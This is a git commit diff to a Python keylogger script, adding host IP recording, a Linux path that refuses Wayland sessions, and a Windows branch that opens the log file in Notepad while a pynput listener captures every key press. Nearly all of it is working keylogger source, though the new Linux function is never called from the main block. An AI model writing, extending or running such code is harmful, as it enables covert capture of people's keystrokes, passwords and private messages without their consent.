c9ac7d9f3c1cb1b75f4768e551c9b180851a8c00
Unknown <f@fff.localdomain>
2026-03-16 05:48:44 +0100

    linux subtype

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,11 @@
 from pynput import keyboard 
 import os
 import socket
+import sys
+import subprocess
+import platform
+import time
+import threading
 
 def get_host_info():
     host_info = os.uname()
@@ -10,7 +15,17 @@ def get_host_info():
         logs.write(f"Release: {host_info.release}\n")
         logs.write(f"Version: {host_info.version}\n")
         logs.write(f"Machine: {host_info.machine}\n")
+        logs.write(f"host ip: {socket.gethostbyname(socket.gethostname())}\n")
         logs.write("\n")
+    return platform.system()
+
+def keylog_linux():
+    if os.environ.get("XDG_SESSION_TYPE") == "wayland":
+        print("Wayland is not supported. Please use X11.")
+        sys.exit(1)
+    listener = keyboard.Listener(on_press=keylog)
+    listener.start()
+    listener.join()
 
 def keylog(key):
     print(str(key))
@@ -29,9 +44,12 @@ def keylog(key):
             
 if __name__ == "__main__":
     get_host_info()
-    listener = keyboard.Listener(on_press=keylog)
-    listener.start()
-    listener.join()
+    if platform.system() == "Windows":
+        subprocess.Popen("notepad.exe logs.txt")
+        listener = keyboard.Listener(on_press=keylog)
+        listener.start()
+        listener.join()
+    
     input()
 
     
